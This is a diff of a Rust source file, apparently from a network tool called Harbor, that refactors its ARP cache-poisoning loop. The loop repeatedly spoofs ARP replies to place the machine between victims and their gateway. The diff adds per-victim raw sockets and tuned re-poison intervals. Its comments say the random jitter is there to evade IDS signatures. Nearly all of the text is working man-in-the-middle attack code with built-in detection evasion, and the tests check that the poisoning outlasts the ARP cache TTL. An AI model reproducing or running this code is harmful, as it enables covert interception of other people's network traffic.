@@ -16,57 +16,72 @@
 //
 // The fix: use separate, much longer intervals for victim vs gateway.
 //
-//   VICTIM_INTERVAL_MS  = 8_000  (8 s)
-//     ARP cache TTL on Windows/Android/iOS is typically 30-60 s.
-//     Re-poisoning every 8 s is well within the window while producing
-//     7-8x less traffic than the old 2 s loop.
+//   VICTIM_INTERVAL_MS  = 4_000  (4 s)
+//   GATEWAY_INTERVAL_MS = 8_000  (8 s)
 //
-//   GATEWAY_INTERVAL_MS = 25_000  (25 s)
-//     The gateway only needs its victim-entry refreshed before it expires.
-//     25 s is safely below the 30 s floor while reducing gateway-directed
-//     ARP traffic by ~12x compared to the old code.
-//
-// Both intervals have ±20% random jitter added.  Uniform-interval ARP
+// Both intervals have ±20% random jitter added. Uniform-interval ARP
 // streams are a textbook IDS signature; jitter makes the traffic pattern
 // look like organic ARP behaviour.
 //
 // ─────────────────────────────────────────────────────────────────────────────
+// Why each PoisonLoop owns its own socket
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// The previous design shared one Arc<Mutex<Box<dyn DataLinkSender>>> across
+// ALL active poison loops plus the scanner. With N victims, N tokio tasks
+// all tried to lock() the same mutex on their individual timers. Even though
+// contention is infrequent (a lock is held only for the microseconds it takes
+// to call send_to()), the shared mutex introduces:
+//
+//   • Unnecessary task wakeup latency — a poison that fires at exactly T may
+//     have to wait for another loop's send to complete first.
+//   • A single point of failure — if the sender errors out, all victims lose
+//     their poison refreshes simultaneously.
+//   • Conceptual coupling — the scanner's send path and the spoofer's send
+//     path have nothing to do with each other at runtime.
+//
+// The fix: each PoisonLoop opens its own AF_PACKET socket on the interface
+// at construction time. The tradeoff is N file descriptors instead of 1,
+// which is negligible for Harbor's target scale (1–20 victims).
+//
+// The main.rs `spoof_sender` Arc is no longer passed to SpooferEngine at all.
 
-use crate::network::packet::{ArpPoison, ArpRestore, GratuitousArp};
-use pnet::datalink::DataLinkSender;
+use crate::network::packet::{ArpPoison, ArpRestore};
+use pnet::datalink::{self, Channel, DataLinkSender, NetworkInterface};
 use pnet::util::MacAddr;
-use std::sync::Arc;
 use std::time::Duration;
-use tokio::sync::Mutex;
 
 // How often to re-poison the VICTIM's ARP cache (victim → gateway entry).
-// Must be well under the victim OS ARP TTL (30-60 s on most platforms).
 const VICTIM_INTERVAL_MS: u64 = 4_000;
 
 // How often to re-poison the GATEWAY's ARP cache (gateway → victim entry).
-// Less frequent because routers have higher ARP TTLs and storm protection.
 const GATEWAY_INTERVAL_MS: u64 = 8_000;
 
 // Jitter fraction: actual interval = base ± (base * JITTER_FRACTION).
-// 0.20 = ±20%.  Breaks the uniform-interval IDS signature.
 const JITTER_FRACTION: f64 = 0.20;
 
 // ─────────────────────────────────────────────────────────────────────────────
 
 pub struct PoisonLoop {
-    sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
+    interface_name: String,
     our_mac: MacAddr,
 }
 
 impl PoisonLoop {
+    /// Creates a new PoisonLoop. The socket is opened lazily in `run()` so
+    /// construction is infallible and cheap.
+    ///
+    /// The `_interval_ms` parameter is retained for API compatibility but
+    /// ignored — the constants above are used instead.
     pub fn new(
-        sender: Arc<Mutex<Box<dyn DataLinkSender>>>,
+        interface_name: impl Into<String>,
         our_mac: MacAddr,
-        // interval_ms kept in signature for API compat but ignored —
-        // we use the constants above instead.
         _interval_ms: u64,
     ) -> Self {
-        Self { sender, our_mac }
+        Self {
+            interface_name: interface_name.into(),
+            our_mac,
+        }
     }
 
     pub async fn run(
@@ -74,8 +89,12 @@ impl PoisonLoop {
         target: super::SpoofTarget,
         mut stop_rx: tokio::sync::oneshot::Receiver<()>,
     ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+        // Open a dedicated AF_PACKET socket for this victim.
+        // Doing this inside run() means errors are reported per-victim and
+        // a single bad interface name doesn't prevent other loops from starting.
+        let mut sender = open_sender(&self.interface_name)?;
 
-        // Pre-build both poison packets — they never change.
+        // Pre-build both poison packets — they never change during a session.
         // Victim believes: gateway IP → our MAC
         let to_victim = ArpPoison::new(
             target.victim_mac,
@@ -91,31 +110,18 @@ impl PoisonLoop {
             self.our_mac,
         );
 
-        let mut victim_count: u64 = 0;
-        let mut gateway_count: u64 = 0;
-
         // Send the first poison immediately so the MITM position is
         // established before the first interval fires.
-        {
-            let v = to_victim.to_bytes();
-            let g = to_gateway.to_bytes();
-            let mut sender = self.sender.lock().await;
-            if let Some(Err(e)) = sender.send_to(&v, None) {
-                eprintln!("[!] initial poison victim {}: {e}", target.victim_ip);
-            }
-            if let Some(Err(e)) = sender.send_to(&g, None) {
-                eprintln!("[!] initial poison gateway for {}: {e}", target.victim_ip);
-            }
-        }
-        victim_count += 1;
-        gateway_count += 1;
+        send_once(&mut *sender, &to_victim.to_bytes(), "initial poison victim");
+        send_once(&mut *sender, &to_gateway.to_bytes(), "initial poison gateway");
 
-        // Track when each side is due for its next refresh.
+        let mut victim_count: u64 = 1;
+        let mut gateway_count: u64 = 1;
+
         let mut next_victim  = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
         let mut next_gateway = tokio::time::Instant::now() + jitter(GATEWAY_INTERVAL_MS);
 
         loop {
-            // Sleep until the sooner of the two next deadlines.
             let wake = next_victim.min(next_gateway);
 
             tokio::select! {
@@ -123,11 +129,7 @@ impl PoisonLoop {
                     let now = tokio::time::Instant::now();
 
                     if now >= next_victim {
-                        let v = to_victim.to_bytes();
-                        let mut sender = self.sender.lock().await;
-                        if let Some(Err(e)) = sender.send_to(&v, None) {
-                            eprintln!("[!] poison victim {}: {e}", target.victim_ip);
-                        }
+                        send_once(&mut *sender, &to_victim.to_bytes(), "poison victim");
                         victim_count += 1;
                         next_victim = now + jitter(VICTIM_INTERVAL_MS);
 
@@ -141,11 +143,7 @@ impl PoisonLoop {
                     }
 
                     if now >= next_gateway {
-                        let g = to_gateway.to_bytes();
-                        let mut sender = self.sender.lock().await;
-                        if let Some(Err(e)) = sender.send_to(&g, None) {
-                            eprintln!("[!] poison gateway for {}: {e}", target.victim_ip);
-                        }
+                        send_once(&mut *sender, &to_gateway.to_bytes(), "poison gateway");
                         gateway_count += 1;
                         next_gateway = now + jitter(GATEWAY_INTERVAL_MS);
 
@@ -161,213 +159,74 @@ impl PoisonLoop {
 
                 _ = &mut stop_rx => {
                     println!("[*] stopping poison for host {}", target.host_id);
-                    self.restore(&target).await?;
+                    restore(&mut *sender, &target);
                     return Ok(());
                 }
             }
         }
     }
+}
 
-    // src/spoofer/poison.rs - replace run():
+// ─────────────────────────────────────────────────────────────────────────────
+// Helpers
+// ─────────────────────────────────────────────────────────────────────────────
 
-    // pub async fn run(
-    //     &self,
-    //     target: super::SpoofTarget,
-    //     mut stop_rx: tokio::sync::oneshot::Receiver<()>,
-    // ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    //     println!(
-    //         "[*] Establishing MITM for {} via gratuitous ARP",
-    //         target.victim_ip
-    //     );
+/// Opens an independent AF_PACKET / DataLinkSender on `interface_name`.
+fn open_sender(
+    interface_name: &str,
+) -> Result<Box<dyn DataLinkSender>, Box<dyn std::error::Error + Send + Sync>> {
+    let interfaces = datalink::interfaces();
+    let iface = interfaces
+        .into_iter()
+        .find(|i| i.name == interface_name)
+        .ok_or_else(|| format!("PoisonLoop: interface '{}' not found", interface_name))?;
 
-    //     // ── Phase 1: One-time gratuitous ARP to claim the victim's IP ────────
-    //     let garp = GratuitousArp::new(target.victim_ip, self.our_mac);
-    //     {
-    //         let mut sender = self.sender.lock().await;
-    //         // Send 3 times for reliability (ARP can drop)
-    //         for _ in 0..3 {
-    //             if let Some(Err(e)) = sender.send_to(&garp.to_bytes(), None) {
-    //                 eprintln!("[!] gratuitous ARP failed: {e}");
-    //             }
-    //             drop(sender);
-    //             tokio::time::sleep(Duration::from_millis(100)).await;
-    //             sender = self.sender.lock().await;
-    //         }
-    //     }
+    match datalink::channel(&iface, Default::default()) {
+        Ok(Channel::Ethernet(tx, _rx)) => Ok(tx),
+        Ok(_) => Err("PoisonLoop: non-ethernet channel".into()),
+        Err(e) => Err(e.into()),
+    }
+}
 
-    //     println!("[+] Gateway now routes {} → our MAC", target.victim_ip);
+/// Sends one packet, logging any error but never panicking.
+/// Lock-free — the sender is exclusively owned by this loop.
+fn send_once(sender: &mut dyn DataLinkSender, bytes: &[u8], label: &str) {
+    if let Some(Err(e)) = sender.send_to(bytes, None) {
+        eprintln!("[!] {label}: {e}");
+    }
+}
 
-    //     // ── Phase 2: Periodic victim-only poisoning ──────────────────────────
-    //     let to_victim = ArpPoison::new(
-    //         target.victim_mac,
-    //         target.victim_ip,
-    //         target.gateway_ip,
-    //         self.our_mac,
-    //     );
+/// Sends 5 ARP restore packets to unwind the poison on both sides.
+fn restore(sender: &mut dyn DataLinkSender, target: &super::SpoofTarget) {
+    println!("[*] restoring ARP caches for {}", target.victim_ip);
 
-    //     let mut next_victim = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
-    //     let mut victim_count = 0u64;
+    let victim_restore = ArpRestore::new(
+        target.victim_mac,
+        target.victim_ip,
+        target.gateway_ip,
+        target.gateway_mac,
+    );
+    let gateway_restore = ArpRestore::new(
+        target.gateway_mac,
+        target.gateway_ip,
+        target.victim_ip,
+        target.victim_mac,
+    );
 
-    //     loop {
-    //         tokio::select! {
-    //             _ = tokio::time::sleep_until(next_victim) => {
-    //                 let v = to_victim.to_bytes();
-    //                 let mut sender = self.sender.lock().await;
-    //                 if let Some(Err(e)) = sender.send_to(&v, None) {
-    //                     eprintln!("[!] poison victim {}: {e}", target.victim_ip);
-    //                 }
-    //                 victim_count += 1;
-    //                 next_victim = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
-
-    //                 if victim_count % 10 == 0 {
-    //                     println!(
-    //                         "[*] victim refresh #{} for {} (gateway untouched)",
-    //                         victim_count, target.victim_ip
-    //                     );
-    //                 }
-    //             }
-    //             _ = &mut stop_rx => {
-    //                 println!("[*] stopping MITM for {}", target.victim_ip);
-    //                 self.restore(&target).await?;
-    //                 return Ok(());
-    //             }
-    //         }
-    //     }
-    // }
-
-
-    async fn restore(
-        &self,
-        target: &super::SpoofTarget,
-    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-        println!("[*] restoring ARP caches for {}", target.victim_ip);
- 
-        // Tell victim the truth: "gateway_ip is at gateway_mac"
-        let victim_restore = ArpRestore::new(
-            target.victim_mac,
-            target.victim_ip,
-            target.gateway_ip,
-            target.gateway_mac,
-        );
- 
-        // Tell gateway the truth: "victim_ip is at victim_mac"
-        // Unicast to gateway_mac — only the gateway updates its cache,
-        // no broadcast that could confuse the switch's MAC table on teardown.
-        let gateway_restore = ArpRestore::new(
-            target.gateway_mac,
-            target.gateway_ip,
-            target.victim_ip,
-            target.victim_mac,
-        );
- 
-        let mut sender = self.sender.lock().await;
-        for _ in 0..5 {
-            if let Some(Err(e)) = sender.send_to(&victim_restore.to_bytes(), None) {
-                eprintln!("[!] restore victim: {e}");
-            }
-            if let Some(Err(e)) = sender.send_to(&gateway_restore.to_bytes(), None) {
-                eprintln!("[!] restore gateway: {e}");
-            }
-            drop(sender);
-            tokio::time::sleep(Duration::from_millis(100)).await;
-            sender = self.sender.lock().await;
-        }
- 
-        println!("[+] ARP caches restored for {}", target.victim_ip);
-        Ok(())
+    for _ in 0..5 {
+        send_once(sender, &victim_restore.to_bytes(),  "restore victim");
+        send_once(sender, &gateway_restore.to_bytes(), "restore gateway");
+        std::thread::sleep(Duration::from_millis(100));
     }
 
-    // async fn restore(
-    //     &self,
-    //     target: &super::SpoofTarget,
-    // ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    //     println!("[*] restoring ARP caches for {}", target.victim_ip);
-
-    //     // Victim restoration (unchanged)
-    //     let victim_restore = ArpRestore::new(
-    //         target.victim_mac,
-    //         target.victim_ip,
-    //         target.gateway_ip,
-    //         target.gateway_mac,
-    //     );
-
-    //     // Gateway restoration: re-announce correct mapping
-    //     let gateway_restore_garp = GratuitousArp::new(
-    //         target.victim_ip,
-    //         target.victim_mac, // ← Real victim MAC now
-    //     );
-
-    //     let mut sender = self.sender.lock().await;
-    //     for _ in 0..5 {
-    //         if let Some(Err(e)) = sender.send_to(&victim_restore.to_bytes(), None) {
-    //             eprintln!("[!] restore victim: {e}");
-    //         }
-    //         if let Some(Err(e)) = sender.send_to(&gateway_restore_garp.to_bytes(), None) {
-    //             eprintln!("[!] restore gateway: {e}");
-    //         }
-    //         drop(sender);
-    //         tokio::time::sleep(Duration::from_millis(100)).await;
-    //         sender = self.sender.lock().await;
-    //     }
-
-    //     println!("[+] ARP caches restored for {}", target.victim_ip);
-    //     Ok(())
-    // }
-
-    // async fn restore(
-    //     &self,
-    //     target: &super::SpoofTarget,
-    // ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    //     println!("[*] restoring ARP caches for host {}", target.host_id);
-
-    //     // Victim learns: gateway IP → real gateway MAC (the truth)
-    //     let victim_restore = ArpRestore::new(
-    //         target.victim_mac,
-    //         target.victim_ip,
-    //         target.gateway_ip,
-    //         target.gateway_mac,
-    //     );
-    //     // Gateway learns: victim IP → real victim MAC (the truth)
-    //     let gateway_restore = ArpRestore::new(
-    //         target.gateway_mac,
-    //         target.gateway_ip,
-    //         target.victim_ip,
-    //         target.victim_mac,
-    //     );
-
-    //     let mut sender = self.sender.lock().await;
-
-    //     // Send 5 restore packets each with a short gap.
-    //     // Multiple copies reduce the chance of a packet drop leaving the
-    //     // cache in a corrupted state.
-    //     for _ in 0..5 {
-    //         if let Some(Err(e)) = sender.send_to(&victim_restore.to_bytes(), None) {
-    //             eprintln!("[!] restore victim: {e}");
-    //         }
-    //         if let Some(Err(e)) = sender.send_to(&gateway_restore.to_bytes(), None) {
-    //             eprintln!("[!] restore gateway: {e}");
-    //         }
-    //         // Brief pause between bursts — same reasoning as the poison
-    //         // refresh rate: give the ARP stack time to process each update.
-    //         drop(sender);
-    //         tokio::time::sleep(Duration::from_millis(100)).await;
-    //         sender = self.sender.lock().await;
-    //     }
-
-    //     println!("[+] ARP caches restored for host {}", target.host_id);
-    //     Ok(())
-    // }
+    println!("[+] ARP caches restored for {}", target.victim_ip);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
 // Jitter helper
-//
-// Returns a Duration of `base_ms ± (base_ms * JITTER_FRACTION)`.
-// Uses a simple LCG seeded from the current time — no external crate needed.
 // ─────────────────────────────────────────────────────────────────────────────
 
 fn jitter(base_ms: u64) -> Duration {
-    // Tiny LCG: good enough for timing jitter, no crypto needed.
     let seed = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap_or_default()
@@ -377,12 +236,15 @@ fn jitter(base_ms: u64) -> Duration {
         .wrapping_add(1_442_695_040_888_963_407))
         >> 33;
 
-    let window = (base_ms as f64 * JITTER_FRACTION) as u64; // e.g. 1_600 for 8_000
-    let offset = rand % (window * 2); // 0 .. 2*window
-    // Shift so range is -window .. +window, then clamp to avoid underflow
+    let window = (base_ms as f64 * JITTER_FRACTION) as u64;
+    let offset = rand % (window * 2);
     let actual = base_ms.saturating_add(offset).saturating_sub(window);
     Duration::from_millis(actual)
 }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Tests
+// ─────────────────────────────────────────────────────────────────────────────
 
 #[cfg(test)]
 mod tests {
@@ -401,13 +263,9 @@ mod tests {
 
     #[test]
     fn test_jitter_not_constant() {
-        // With 1000 samples the probability of all being identical is ~0.
         let samples: Vec<u64> = (0..20).map(|_| jitter(8_000).as_millis() as u64).collect();
         let unique: std::collections::HashSet<u64> = samples.iter().copied().collect();
-        assert!(
-            unique.len() > 1,
-            "jitter produced identical values — LCG broken"
-        );
+        assert!(unique.len() > 1, "jitter produced identical values — LCG broken");
     }
 
     #[test]
@@ -420,9 +278,14 @@ mod tests {
 
     #[test]
     fn test_intervals_under_arp_ttl() {
-        // Both intervals must be well under the minimum ARP TTL (30_000 ms)
-        // or the cache expires before we re-poison it.
         assert!(VICTIM_INTERVAL_MS < 30_000);
         assert!(GATEWAY_INTERVAL_MS < 30_000);
+    }
+
+    // Verify that PoisonLoop can be constructed without touching the network.
+    #[test]
+    fn test_new_is_cheap_and_infallible() {
+        let mac = pnet::util::MacAddr(0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF);
+        let _loop = PoisonLoop::new("eth0", mac, 0);
     }
 }
